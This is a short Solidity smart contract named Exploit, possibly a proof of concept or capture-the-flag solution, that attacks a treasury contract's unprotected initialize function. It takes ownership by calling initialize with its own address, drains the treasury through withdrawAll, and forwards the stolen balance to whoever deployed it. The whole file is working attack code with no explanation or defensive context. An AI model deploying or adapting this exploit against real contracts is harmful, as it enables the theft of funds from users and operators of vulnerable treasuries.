// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITreasury {
    function initialize(address _owner) external;
    function withdrawAll(address payable to) external;
}

contract Exploit {
    address public target;
    address payable public owner;

    constructor(address _target) payable {
        target = _target;
        owner = payable(msg.sender);
    }

    function attack() external {
        ITreasury(target).initialize(address(this));
        ITreasury(target).withdrawAll(payable(address(this)));
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "forward failed");
    }

    receive() external payable {}
}